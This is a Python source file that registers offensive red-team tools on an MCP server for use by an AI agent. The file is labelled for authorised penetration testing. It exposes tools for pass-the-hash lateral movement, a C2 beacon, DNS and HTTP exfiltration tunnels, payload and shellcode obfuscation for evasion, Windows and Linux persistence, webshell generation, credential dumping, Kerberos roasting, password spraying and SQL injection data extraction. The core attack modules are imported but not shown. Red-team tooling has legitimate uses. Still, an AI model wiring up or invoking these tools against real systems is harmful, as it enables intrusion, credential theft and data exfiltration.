#!/usr/bin/env python3
"""
Red Team 高级工具 MCP 集成
包含: 横向移动、C2通信、Payload混淆、隐蔽通信、纯Python漏洞利用
仅用于授权渗透测试
"""

import json
import logging

from utils.mcp_tooling import patch_mcp_tool

logger = logging.getLogger(__name__)


def register_redteam_tools(mcp):
    """注册 Red Team 高级工具到 MCP Server"""
    patch_mcp_tool(mcp)

    registered_tools = []

    # ==================== 横向移动工具 ====================

    @mcp.tool()
    def lateral_smb_exec(
        target: str,
        username: str,
        password: str = "",
        ntlm_hash: str = "",
        command: str = "whoami",
        domain: str = "",
        method: str = "smbexec",
    ) -> str:
        """SMB横向移动 - Pass-the-Hash/密码执行远程命令

        Args:
            target: 目标主机IP
            username: 用户名
            password: 密码 (与ntlm_hash二选一)
            ntlm_hash: NTLM哈希 (格式: LM:NT 或 NT)
            command: 要执行的命令
            domain: 域名 (可选)
            method: 执行方式 (smbexec/psexec/wmiexec)

        Returns:
            JSON格式执行结果
        """
        try:
            from core.lateral import smb_exec

            result = smb_exec(
                target=target,
                username=username,
                password=password,
                command=command,
                domain=domain,
                ntlm_hash=ntlm_hash if ntlm_hash else None,
                method=method,
            )

            return json.dumps(result, indent=2, ensure_ascii=False)

        except ImportError as e:
            return json.dumps(
                {
                    "success": False,
                    "error": f"模块导入失败: {e}",
                    "hint": "需要安装 impacket: pip install impacket",
                }
            )
        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("lateral_smb_exec")

    @mcp.tool()
    def lateral_smb_upload(
        target: str,
        username: str,
        password: str,
        local_file: str,
        remote_path: str,
        share: str = "C$",
        domain: str = "",
    ) -> str:
        """SMB文件上传 - 上传文件到远程主机

        Args:
            target: 目标主机IP
            username: 用户名
            password: 密码
            local_file: 本地文件路径
            remote_path: 远程路径 (相对于share)
            share: 共享名 (默认C$)
            domain: 域名 (可选)

        Returns:
            JSON格式结果
        """
        try:
            from core.lateral import smb_upload

            result = smb_upload(
                target=target,
                username=username,
                password=password,
                local_file=local_file,
                remote_path=remote_path,
                share=share,
                domain=domain,
            )

            return json.dumps(result, indent=2, ensure_ascii=False)

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("lateral_smb_upload")

    @mcp.tool()
    def lateral_ssh_exec(
        target: str,
        username: str,
        password: str = "",
        key_file: str = "",
        command: str = "id",
        port: int = 22,
    ) -> str:
        """SSH横向移动 - 密码/密钥执行远程命令

        Args:
            target: 目标主机IP
            username: 用户名
            password: 密码 (与key_file二选一)
            key_file: 私钥文件路径
            command: 要执行的命令
            port: SSH端口 (默认22)

        Returns:
            JSON格式执行结果
        """
        try:
            from core.lateral import ssh_exec

            result = ssh_exec(
                target=target,
                username=username,
                password=password,
                command=command,
                port=port,
                key_file=key_file if key_file else None,
            )

            return json.dumps(result, indent=2, ensure_ascii=False)

        except ImportError as e:
            return json.dumps(
                {
                    "success": False,
                    "error": f"模块导入失败: {e}",
                    "hint": "需要安装 paramiko: pip install paramiko",
                }
            )
        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("lateral_ssh_exec")

    @mcp.tool()
    def lateral_ssh_tunnel(
        target: str,
        username: str,
        password: str,
        tunnel_type: str = "local",
        local_port: int = 8080,
        remote_host: str = "127.0.0.1",
        remote_port: int = 80,
        port: int = 22,
    ) -> str:
        """SSH隧道 - 创建端口转发隧道

        Args:
            target: SSH服务器IP
            username: 用户名
            password: 密码
            tunnel_type: 隧道类型 (local/remote/dynamic)
            local_port: 本地端口
            remote_host: 远程目标主机 (local/remote类型需要)
            remote_port: 远程目标端口
            port: SSH端口 (默认22)

        Returns:
            JSON格式隧道信息
        """
        try:
            from core.lateral import ssh_tunnel

            result = ssh_tunnel(
                target=target,
                username=username,
                password=password,
                tunnel_type=tunnel_type,
                local_port=local_port,
                remote_host=remote_host,
                remote_port=remote_port,
                port=port,
            )

            return json.dumps(result, indent=2, ensure_ascii=False)

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("lateral_ssh_tunnel")

    @mcp.tool()
    def lateral_wmi_exec(
        target: str,
        username: str,
        password: str,
        command: str = "whoami",
        domain: str = "",
        get_output: bool = False,
    ) -> str:
        """WMI横向移动 - Windows远程命令执行

        Args:
            target: 目标主机IP
            username: 用户名
            password: 密码
            command: 要执行的命令
            domain: 域名 (可选)
            get_output: 是否获取命令输出

        Returns:
            JSON格式执行结果
        """
        try:
            from core.lateral import wmi_exec

            result = wmi_exec(
                target=target,
                username=username,
                password=password,
                command=command,
                domain=domain,
                get_output=get_output,
            )

            return json.dumps(result, indent=2, ensure_ascii=False)

        except ImportError as e:
            return json.dumps(
                {
                    "success": False,
                    "error": f"模块导入失败: {e}",
                    "hint": "需要安装 impacket: pip install impacket",
                }
            )
        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("lateral_wmi_exec")

    @mcp.tool()
    def lateral_wmi_query(
        target: str,
        username: str,
        password: str,
        query: str = "SELECT * FROM Win32_OperatingSystem",
        domain: str = "",
    ) -> str:
        """WMI查询 - 远程系统信息收集

        Args:
            target: 目标主机IP
            username: 用户名
            password: 密码
            query: WQL查询语句
            domain: 域名 (可选)

        常用查询:
            - Win32_OperatingSystem: 操作系统信息
            - Win32_Process: 进程列表
            - Win32_Service: 服务列表
            - Win32_UserAccount: 用户列表
            - Win32_NetworkAdapterConfiguration: 网络配置

        Returns:
            JSON格式查询结果
        """
        try:
            from core.lateral import wmi_query

            result = wmi_query(
                target=target, username=username, password=password, wql=query, domain=domain
            )

            return json.dumps(result, indent=2, ensure_ascii=False)

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("lateral_wmi_query")

    # ==================== C2 通信工具 ====================

    @mcp.tool()
    def c2_beacon_start(
        server_url: str, interval: int = 30, jitter: float = 0.2, use_https: bool = True
    ) -> str:
        """启动C2 Beacon客户端 - 建立命令控制通道

        Args:
            server_url: C2服务器地址 (如 https://c2.example.com)
            interval: 回连间隔秒数 (默认30)
            jitter: 抖动比例 (默认0.2, 即±20%)
            use_https: 是否使用HTTPS (默认True)

        Returns:
            JSON格式Beacon信息
        """
        try:
            from core.c2 import BeaconConfig, create_beacon

            config = BeaconConfig(
                server_url=server_url, interval=interval, jitter=jitter, use_https=use_https
            )

            beacon = create_beacon(config)

            return json.dumps(
                {
                    "success": True,
                    "beacon_id": beacon.beacon_id,
                    "server": server_url,
                    "interval": interval,
                    "jitter": jitter,
                    "status": "initialized",
                },
                indent=2,
            )

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("c2_beacon_start")

    @mcp.tool()
    def c2_dns_tunnel(domain: str, data: str, xor_key: str = "", chunk_size: int = 30) -> str:
        """DNS隧道数据外传 - 通过DNS查询传输数据

        Args:
            domain: 控制域名 (如 c2.example.com)
            data: 要外传的数据
            xor_key: XOR加密密钥 (可选)
            chunk_size: 分块大小 (默认30字节)

        Returns:
            JSON格式传输结果
        """
        try:
            from core.c2 import DNSTunnel

            tunnel = DNSTunnel(domain, xor_key=xor_key if xor_key else None)
            result = tunnel.send_data(data.encode(), chunk_size=chunk_size)

            return json.dumps(
                {
                    "success": True,
                    "domain": domain,
                    "data_size": len(data),
                    "chunks_sent": result.get("chunks_sent", 0),
                    "method": "DNS TXT query",
                },
                indent=2,
            )

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("c2_dns_tunnel")

    @mcp.tool()
    def c2_http_tunnel(url: str, data: str, method: str = "body", xor_key: str = "") -> str:
        """HTTP隧道数据外传 - 通过HTTP请求传输数据

        Args:
            url: 目标URL
            data: 要外传的数据
            method: 隐藏方式 (body/cookie/header/param)
            xor_key: XOR加密密钥 (可选)

        Returns:
            JSON格式传输结果
        """
        try:
            from core.c2 import HTTPTunnel

            tunnel = HTTPTunnel(url, xor_key=xor_key if xor_key else None)
            result = tunnel.send_data(data.encode(), method=method)

            return json.dumps(
                {
                    "success": True,
                    "url": url,
                    "data_size": len(data),
                    "method": method,
                    "status": result.get("status", "sent"),
                },
                indent=2,
            )

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("c2_http_tunnel")

    # ==================== Payload混淆工具 ====================

    @mcp.tool()
    def evasion_obfuscate_payload(
        payload: str, encoding: str = "xor", key: str = "", multilayer: bool = False
    ) -> str:
        """Payload混淆 - 编码/加密Payload绕过检测

        Args:
            payload: 原始Payload代码
            encoding: 编码类型 (xor/aes/base64/base32/hex/rot13/unicode)
            key: 加密密钥 (XOR/AES需要，不填则自动生成)
            multilayer: 是否使用多层编码

        Returns:
            JSON格式混淆结果 (含解码器代码)
        """
        try:
            from core.evasion import obfuscate_payload

            result = obfuscate_payload(
                payload=payload, encoding=encoding, key=key, multilayer=multilayer
            )

            return json.dumps(result, indent=2, ensure_ascii=False)

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("evasion_obfuscate_payload")

    @mcp.tool()
    def evasion_obfuscate_python(
        code: str,
        rename_vars: bool = True,
        add_junk: bool = True,
        obfuscate_strings: bool = True,
        compress: bool = False,
    ) -> str:
        """Python代码混淆 - 变量重命名/字符串编码/垃圾代码

        Args:
            code: 原始Python代码
            rename_vars: 是否重命名变量 (默认True)
            add_junk: 是否添加垃圾代码 (默认True)
            obfuscate_strings: 是否混淆字符串 (默认True)
            compress: 是否压缩代码 (默认False)

        Returns:
            JSON格式混淆结果
        """
        try:
            from core.evasion import obfuscate_python_code

            result = obfuscate_python_code(
                code=code,
                rename_vars=rename_vars,
                add_junk=add_junk,
                obfuscate_strings=obfuscate_strings,
                compress=compress,
            )

            return json.dumps(result, indent=2, ensure_ascii=False)

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("evasion_obfuscate_python")

    @mcp.tool()
    def evasion_shellcode_loader(
        shellcode_hex: str, xor_encrypt: bool = True, platform: str = "windows"
    ) -> str:
        """Shellcode加载器生成 - 生成Python加载器代码

        Args:
            shellcode_hex: 十六进制Shellcode (如 "fc4883e4f0...")
            xor_encrypt: 是否XOR加密 (默认True)
            platform: 目标平台 (windows/linux)

        Returns:
            JSON格式加载器代码
        """
        try:
            from core.evasion import generate_shellcode_loader

            result = generate_shellcode_loader(
                shellcode_hex=shellcode_hex, xor_encrypt=xor_encrypt, platform=platform
            )

            return json.dumps(result, indent=2, ensure_ascii=False)

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("evasion_shellcode_loader")

    # ==================== 隐蔽通信工具 ====================

    @mcp.tool()
    def stealth_request(
        url: str,
        method: str = "GET",
        humanize: bool = True,
        spoof_fingerprint: bool = True,
        browser: str = "chrome",
        proxy: str = "",
    ) -> str:
        """隐蔽HTTP请求 - 模拟真实浏览器行为

        Args:
            url: 目标URL
            method: HTTP方法 (GET/POST)
            humanize: 是否人性化请求 (随机延迟、Header变异)
            spoof_fingerprint: 是否伪造浏览器指纹
            browser: 浏览器类型 (chrome/firefox/safari/edge)
            proxy: 代理地址 (可选)

        Returns:
            JSON格式响应结果
        """
        try:
            import requests

            from core.stealth import BrowserType, FingerprintSpoofer, TrafficMutator

            # 创建Session - 优先使用统一 HTTP 客户端工厂
            try:
                from core.http import get_sync_client

                session = get_sync_client(proxy=proxy, force_new=True)
            except ImportError:
                session = requests.Session()

            # 应用浏览器指纹
            if spoof_fingerprint:
                browser_map = {
                    "chrome": BrowserType.CHROME,
                    "firefox": BrowserType.FIREFOX,
                    "safari": BrowserType.SAFARI,
                    "edge": BrowserType.EDGE,
                }
                spoofer = FingerprintSpoofer()
                browser_type = browser_map.get(browser.lower(), BrowserType.CHROME)
                headers = spoofer.get_headers(browser_type)
                session.headers.update(headers)

            # 人性化请求
            if humanize:
                mutator = TrafficMutator()
                # 添加随机延迟
                import random
                import time

                time.sleep(random.uniform(0.5, 2.0))

            # 设置代理
            proxies = {}
            if proxy:
                proxies = {"http": proxy, "https": proxy}

            # 发送请求
            resp = session.request(
                method=method,
                url=url,
                proxies=proxies if proxies else None,
                timeout=15,
                verify=False,
            )

            return json.dumps(
                {
                    "success": True,
                    "url": url,
                    "status_code": resp.status_code,
                    "headers": dict(resp.headers),
                    "content_length": len(resp.content),
                    "browser_emulated": browser,
                },
                indent=2,
                ensure_ascii=False,
            )

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("stealth_request")

    @mcp.tool()
    def stealth_proxy_pool(action: str = "list", proxy: str = "", proxy_type: str = "http") -> str:
        """代理池管理 - 添加/验证/获取代理

        Args:
            action: 操作类型 (add/remove/validate/get/list)
            proxy: 代理地址 (add/remove/validate需要)
            proxy_type: 代理类型 (http/https/socks4/socks5)

        Returns:
            JSON格式结果
        """
        try:
            from core.stealth import Proxy, ProxyPool

            pool = ProxyPool()

            if action == "add":
                if not proxy:
                    return json.dumps({"success": False, "error": "需要提供proxy参数"})
                p = Proxy(
                    host=proxy.split(":")[0],
                    port=int(proxy.split(":")[1]) if ":" in proxy else 8080,
                    type=proxy_type,
                )
                pool.add_proxy(p)
                return json.dumps({"success": True, "action": "added", "proxy": proxy})

            elif action == "get":
                p = pool.get_proxy()
                if p:
                    return json.dumps(
                        {"success": True, "proxy": f"{p.host}:{p.port}", "type": p.type}
                    )
                return json.dumps({"success": False, "error": "代理池为空"})

            elif action == "list":
                proxies = pool.list_proxies()
                return json.dumps(
                    {"success": True, "count": len(proxies), "proxies": proxies}, indent=2
                )

            elif action == "validate":
                if not proxy:
                    return json.dumps({"success": False, "error": "需要提供proxy参数"})
                # 简单验证
                import requests

                try:
                    resp = requests.get(
                        "http://httpbin.org/ip",
                        proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"},
                        timeout=10,
                    )
                    return json.dumps(
                        {
                            "success": True,
                            "proxy": proxy,
                            "valid": resp.status_code == 200,
                            "external_ip": resp.json().get("origin", "unknown"),
                        }
                    )
                except (requests.RequestException, KeyError, ValueError):
                    return json.dumps({"success": True, "proxy": proxy, "valid": False})

            else:
                return json.dumps({"success": False, "error": f"未知操作: {action}"})

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("stealth_proxy_pool")

    # ==================== 纯Python漏洞利用工具 ====================

    @mcp.tool()
    def exploit_sqli_detect(
        url: str, param: str = "", method: str = "GET", data: str = "", cookie: str = ""
    ) -> str:
        """纯Python SQL注入检测 - 无需sqlmap

        Args:
            url: 目标URL (含参数，如 http://example.com/page?id=1)
            param: 测试参数名 (不填则测试所有参数)
            method: HTTP方法 (GET/POST)
            data: POST数据 (JSON格式)
            cookie: Cookie字符串

        Returns:
            JSON格式检测结果
        """
        try:
            from core.exploit import detect_sqli

            result = detect_sqli(
                url=url,
                param=param if param else None,
                method=method,
                data=json.loads(data) if data else None,
                cookies=cookie if cookie else None,
            )

            return json.dumps(result, indent=2, ensure_ascii=False)

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("exploit_sqli_detect")

    @mcp.tool()
    def exploit_sqli_extract(
        url: str, param: str, db_type: str = "mysql", extract: str = "database", method: str = "GET"
    ) -> str:
        """SQL注入数据提取 - 获取数据库信息

        Args:
            url: 注入点URL
            param: 注入参数名
            db_type: 数据库类型 (mysql/postgresql/mssql/oracle/sqlite)
            extract: 提取内容 (database/tables/columns/data)
            method: HTTP方法 (GET/POST)

        Returns:
            JSON格式提取结果
        """
        try:
            from core.exploit import DBType, exploit_sqli

            db_map = {
                "mysql": DBType.MYSQL,
                "postgresql": DBType.POSTGRESQL,
                "mssql": DBType.MSSQL,
                "oracle": DBType.ORACLE,
                "sqlite": DBType.SQLITE,
            }

            result = exploit_sqli(
                url=url,
                param=param,
                db_type=db_map.get(db_type.lower(), DBType.MYSQL),
                extract=extract,
                method=method,
            )

            return json.dumps(result, indent=2, ensure_ascii=False)

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("exploit_sqli_extract")

    @mcp.tool()
    def exploit_port_scan(
        target: str, ports: str = "top100", timeout: float = 1.0, threads: int = 100
    ) -> str:
        """纯Python端口扫描 - 无需nmap

        Args:
            target: 目标主机/IP
            ports: 端口范围 (如 "1-1000", "80,443,8080", "top100", "common")
            timeout: 连接超时秒数
            threads: 并发线程数

        Returns:
            JSON格式扫描结果
        """
        try:
            from core.exploit import scan_ports

            result = scan_ports(target=target, ports=ports, timeout=timeout, max_threads=threads)

            return json.dumps(result, indent=2, ensure_ascii=False)

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("exploit_port_scan")

    @mcp.tool()
    def exploit_service_detect(target: str, port: int) -> str:
        """服务指纹识别 - 识别端口运行的服务

        Args:
            target: 目标主机/IP
            port: 目标端口

        Returns:
            JSON格式服务信息
        """
        try:
            from core.exploit import PurePortScanner

            scanner = PurePortScanner(target)
            result = scanner.detect_service(port)

            return json.dumps(
                {"success": True, "target": target, "port": port, "service": result},
                indent=2,
                ensure_ascii=False,
            )

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("exploit_service_detect")

    @mcp.tool()
    def exploit_network_scan(
        network: str, ports: str = "22,80,443,3389", timeout: float = 0.5
    ) -> str:
        """网络扫描 - 发现存活主机和开放端口

        Args:
            network: 目标网段 (如 192.168.1.0/24)
            ports: 扫描端口 (逗号分隔)
            timeout: 超时秒数

        Returns:
            JSON格式扫描结果
        """
        try:
            from core.exploit import scan_network

            result = scan_network(network=network, ports=ports, timeout=timeout)

            return json.dumps(result, indent=2, ensure_ascii=False)

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("exploit_network_scan")

    # ==================== 综合工具 ====================

    @mcp.tool()
    def redteam_recon(
        target: str, scan_ports: bool = True, detect_waf: bool = True, stealth: bool = True
    ) -> str:
        """Red Team侦察 - 综合信息收集

        Args:
            target: 目标主机/URL
            scan_ports: 是否扫描端口
            detect_waf: 是否检测WAF
            stealth: 是否使用隐蔽模式

        Returns:
            JSON格式侦察结果
        """
        try:
            results = {"target": target, "recon": {}}

            # 端口扫描
            if scan_ports:
                try:
                    from core.exploit import quick_scan

                    port_result = quick_scan(target)
                    results["recon"]["ports"] = port_result
                except Exception as e:
                    results["recon"]["ports"] = {"error": str(e)}

            # WAF检测 (简单实现)
            if detect_waf:
                try:
                    import requests

                    headers = {}
                    if stealth:
                        from core.stealth import BrowserType, FingerprintSpoofer

                        spoofer = FingerprintSpoofer()
                        headers = spoofer.get_headers(BrowserType.CHROME)

                    url = target if target.startswith("http") else f"http://{target}"
                    resp = requests.get(url, headers=headers, timeout=10, verify=False)

                    waf_indicators = {
                        "cloudflare": ["cf-ray", "__cfduid", "cloudflare"],
                        "aws_waf": ["x-amzn-requestid", "aws"],
                        "akamai": ["akamai", "x-akamai"],
                        "imperva": ["incap_ses", "visid_incap"],
                    }

                    detected_waf = None
                    resp_text = resp.text.lower()
                    resp_headers = str(resp.headers).lower()

                    for waf, indicators in waf_indicators.items():
                        for indicator in indicators:
                            if indicator in resp_text or indicator in resp_headers:
                                detected_waf = waf
                                break
                        if detected_waf:
                            break

                    results["recon"]["waf"] = {
                        "detected": detected_waf is not None,
                        "type": detected_waf,
                    }

                except Exception as e:
                    results["recon"]["waf"] = {"error": str(e)}

            results["success"] = True
            return json.dumps(results, indent=2, ensure_ascii=False)

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("redteam_recon")

    @mcp.tool()
    def redteam_lateral_chain(
        targets: str, username: str, password: str, command: str = "whoami", method: str = "auto"
    ) -> str:
        """横向移动链 - 批量执行命令

        Args:
            targets: 目标主机列表 (逗号分隔)
            username: 用户名
            password: 密码
            command: 要执行的命令
            method: 执行方式 (auto/smb/ssh/wmi)

        Returns:
            JSON格式批量执行结果
        """
        try:
            target_list = [t.strip() for t in targets.split(",") if t.strip()]
            results = {"success": True, "total": len(target_list), "results": []}

            for target in target_list:
                try:
                    result = {"target": target}

                    if method == "ssh" or (method == "auto" and ":" not in target):
                        # SSH
                        from core.lateral import ssh_exec

                        exec_result = ssh_exec(target, username, password, command)
                        result["method"] = "ssh"
                        result["output"] = exec_result

                    elif method == "wmi" or method == "auto":
                        # WMI
                        from core.lateral import wmi_exec

                        exec_result = wmi_exec(target, username, password, command)
                        result["method"] = "wmi"
                        result["output"] = exec_result

                    else:
                        # SMB
                        from core.lateral import smb_exec

                        exec_result = smb_exec(target, username, password, command)
                        result["method"] = "smb"
                        result["output"] = exec_result

                    results["results"].append(result)

                except Exception as e:
                    results["results"].append({"target": target, "error": str(e)})

            return json.dumps(results, indent=2, ensure_ascii=False)

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("redteam_lateral_chain")

    # ==================== 持久化工具 ====================

    @mcp.tool()
    def persistence_windows(
        payload_path: str, method: str = "registry", name: str = "", hidden: bool = True
    ) -> str:
        """Windows持久化 - 多种持久化技术

        Args:
            payload_path: Payload路径
            method: 持久化方式 (registry/scheduled_task/service/wmi/startup/screensaver/bits)
            name: 持久化项目名称 (不填则自动生成)
            hidden: 是否隐藏 (默认True)

        Returns:
            JSON格式结果
        """
        try:
            from core.persistence import windows_persist

            result = windows_persist(payload_path=payload_path, method=method, name=name)

            return json.dumps(result, indent=2, ensure_ascii=False)

        except ImportError as e:
            return json.dumps(
                {"success": False, "error": f"模块导入失败: {e}", "hint": "仅支持Windows平台"}
            )
        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("persistence_windows")

    @mcp.tool()
    def persistence_linux(
        command: str, method: str = "crontab", user: str = "", hidden: bool = True
    ) -> str:
        """Linux持久化 - 多种持久化技术

        Args:
            command: 要持久化的命令
            method: 持久化方式 (crontab/systemd/bashrc/profile/ssh/ld_preload/init_d/rc_local)
            user: 目标用户 (不填则当前用户)
            hidden: 是否隐藏 (默认True)

        Returns:
            JSON格式结果
        """
        try:
            from core.persistence import LinuxPersistence

            persistence = LinuxPersistence()

            if method == "crontab":
                result = persistence.crontab(command, hidden=hidden)
            elif method == "systemd":
                result = persistence.systemd_service(command, hidden=hidden)
            elif method == "bashrc":
                result = persistence.bashrc(command, user=user)
            elif method == "profile":
                result = persistence.profile(command, user=user)
            elif method == "ssh":
                # SSH需要公钥
                return json.dumps(
                    {"success": False, "error": "SSH方式请使用persistence_ssh_key工具"}
                )
            elif method == "init_d":
                result = persistence.init_d(command)
            elif method == "rc_local":
                result = persistence.rc_local(command)
            else:
                return json.dumps({"success": False, "error": f"未知方法: {method}"})

            return json.dumps(
                {
                    "success": result.success,
                    "method": method,
                    "details": result.details if hasattr(result, "details") else str(result),
                },
                indent=2,
                ensure_ascii=False,
            )

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("persistence_linux")

    @mcp.tool()
    def persistence_webshell(
        shell_type: str = "php",
        password: str = "",
        obfuscation: str = "none",
        tool_compatible: str = "",
    ) -> str:
        """Webshell生成 - 多种类型和兼容工具

        Args:
            shell_type: Shell类型 (php/jsp/aspx/python)
            password: 连接密码 (不填则自动生成)
            obfuscation: 混淆级别 (none/low/medium/high)
            tool_compatible: 兼容工具 (behinder/godzilla)

        Returns:
            JSON格式包含Shell代码
        """
        try:
            from core.persistence import ObfuscationLevel, WebshellGenerator

            obf_map = {
                "none": ObfuscationLevel.NONE,
                "low": ObfuscationLevel.LOW,
                "medium": ObfuscationLevel.MEDIUM,
                "high": ObfuscationLevel.HIGH,
            }

            generator = WebshellGenerator()

            if tool_compatible == "behinder":
                result = generator.behinder_shell()
            elif tool_compatible == "godzilla":
                result = generator.godzilla_shell(password=password)
            elif shell_type == "php":
                result = generator.php_shell(
                    password=password, obfuscation=obf_map.get(obfuscation, ObfuscationLevel.NONE)
                )
            elif shell_type == "jsp":
                result = generator.jsp_shell(password=password)
            elif shell_type == "aspx":
                result = generator.aspx_shell(password=password)
            elif shell_type == "python":
                result = generator.python_shell(password=password)
            else:
                return json.dumps({"success": False, "error": f"未知Shell类型: {shell_type}"})

            return json.dumps(
                {
                    "success": True,
                    "type": (
                        result.shell_type.value
                        if hasattr(result.shell_type, "value")
                        else shell_type
                    ),
                    "password": result.password,
                    "code": result.code,
                    "usage": result.usage,
                },
                indent=2,
                ensure_ascii=False,
            )

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("persistence_webshell")

    # ==================== 凭证收集工具 ====================

    @mcp.tool()
    def credential_dump(categories: str = "all", verbose: bool = False) -> str:
        """凭证提取 - 提取系统保存的凭证

        Args:
            categories: 提取类别 (all/wifi/vault/registry/shadow/ssh/chrome/firefox/env)
            verbose: 是否输出详细日志

        支持提取:
            - Windows: WiFi密码, 凭据管理器, 注册表(PuTTY/WinSCP)
            - Linux: /etc/shadow, SSH密钥
            - 跨平台: Chrome/Firefox密码, 环境变量

        Returns:
            JSON格式凭证列表
        """
        try:
            from core.credential import dump_credentials

            if categories == "all":
                cats = None
            else:
                cats = [c.strip() for c in categories.split(",")]

            result = dump_credentials(categories=cats, verbose=verbose)

            return json.dumps(result, indent=2, ensure_ascii=False)

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("credential_dump")

    @mcp.tool()
    def credential_find_secrets(
        path: str, recursive: bool = True, include_git: bool = False
    ) -> str:
        """敏感信息搜索 - 搜索文件中的密码/密钥/Token

        Args:
            path: 搜索路径
            recursive: 是否递归搜索 (默认True)
            include_git: 是否搜索Git历史 (默认False)

        搜索类型:
            - 密码/凭证
            - API密钥 (AWS/Google/GitHub/Stripe等)
            - 私钥/证书
            - 数据库连接字符串
            - JWT Token
            - Webhook URL

        Returns:
            JSON格式搜索结果
        """
        try:
            from core.credential import find_secrets

            result = find_secrets(
                path=path, recursive=recursive, include_git=include_git, verbose=False
            )

            return json.dumps(result, indent=2, ensure_ascii=False)

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("credential_find_secrets")

    # ==================== AD渗透工具 ====================

    @mcp.tool()
    def ad_enumerate(
        domain: str, dc_ip: str = "", username: str = "", password: str = "", enum_type: str = "all"
    ) -> str:
        """AD域枚举 - LDAP查询域信息

        Args:
            domain: 域名 (如 contoso.com)
            dc_ip: 域控IP (不填则自动解析)
            username: 用户名 (可选,支持匿名枚举)
            password: 密码
            enum_type: 枚举类型 (all/users/groups/computers/spn/gpo/trusts/domain_admins)

        Returns:
            JSON格式枚举结果
        """
        try:
            from core.ad import ad_enumerate as _ad_enumerate

            result = _ad_enumerate(
                domain=domain,
                dc_ip=dc_ip if dc_ip else None,
                username=username,
                password=password,
                enum_type=enum_type,
                verbose=False,
            )

            return json.dumps(result, indent=2, ensure_ascii=False)

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("ad_enumerate")

    @mcp.tool()
    def ad_kerberos_attack(
        domain: str, dc_ip: str, attack_type: str, targets: str, password: str = ""
    ) -> str:
        """Kerberos攻击 - AS-REP Roasting/密码喷洒/用户枚举

        Args:
            domain: 域名
            dc_ip: 域控IP
            attack_type: 攻击类型 (asrep/spray/enum)
            targets: 目标列表 (逗号分隔的用户名)
            password: 密码 (spray攻击需要)

        攻击类型说明:
            - asrep: AS-REP Roasting (获取不需预认证用户的hash)
            - spray: 密码喷洒 (对多用户尝试同一密码)
            - enum: 用户枚举 (通过Kerberos错误码判断用户存在)

        Returns:
            JSON格式攻击结果 (含可破解的hash)
        """
        try:
            from core.ad import kerberos_attack as _kerberos_attack

            target_list = [t.strip() for t in targets.split(",") if t.strip()]

            result = _kerberos_attack(
                domain=domain,
                dc_ip=dc_ip,
                attack_type=attack_type,
                targets=target_list,
                password=password,
                verbose=False,
            )

            return json.dumps(result, indent=2, ensure_ascii=False)

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("ad_kerberos_attack")

    @mcp.tool()
    def ad_spn_scan(domain: str, dc_ip: str = "", username: str = "", password: str = "") -> str:
        """SPN扫描 - 发现Kerberoasting目标

        Args:
            domain: 域名
            dc_ip: 域控IP
            username: 用户名 (可选)
            password: 密码 (可选)

        Returns:
            JSON格式SPN列表 (可用于Kerberoasting)
        """
        try:
            from core.ad import ad_enumerate as _ad_enumerate

            result = _ad_enumerate(
                domain=domain,
                dc_ip=dc_ip if dc_ip else None,
                username=username,
                password=password,
                enum_type="spn",
                verbose=False,
            )

            return json.dumps(result, indent=2, ensure_ascii=False)

        except Exception as e:
            return json.dumps({"success": False, "error": str(e)})

    registered_tools.append("ad_spn_scan")

    logger.info(f"已注册 {len(registered_tools)} 个 Red Team 工具")
    return registered_tools
